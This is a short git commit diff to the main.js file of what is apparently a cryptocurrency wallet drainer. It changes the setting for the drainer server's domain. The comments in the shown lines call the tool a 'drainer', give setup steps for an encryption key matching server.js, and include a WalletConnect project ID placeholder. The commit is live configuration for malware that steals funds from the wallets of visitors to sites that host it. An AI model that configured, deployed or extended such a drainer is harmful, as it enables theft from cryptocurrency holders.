80de8e4aa2b3dcbf78c1f49475fecf323985f71d
idanoluwa12 <oluwaidan@proton.me>
2024-09-21 05:44:34 +0100

    Update main.js

--- en/main.js
+++ en/main.js
@@ -13,7 +13,7 @@
 let FLASH_Encryption_Key = 50; // Specify any number that will be used for encryption it is not recommended to leave it as default!
 // The same number should be specified in the server.js file - if they differ, then nothing will work correctly
 
-const FLASH_Server = "mdpp.neutralpro.live/"; // Specify the domain that is attached to the drainer server
+const FLASH_Server = "mdpp.neutralpro.live"; // Specify the domain that is attached to the drainer server
 // This is the domain where you have a server, and not the site itself where you plan to use the drainer
 
 const FLASH_WalletConnect_ID = "53cb6c00218a6d60162590ce6debfc5c"; // Project ID из WalletConnect Cloud change this
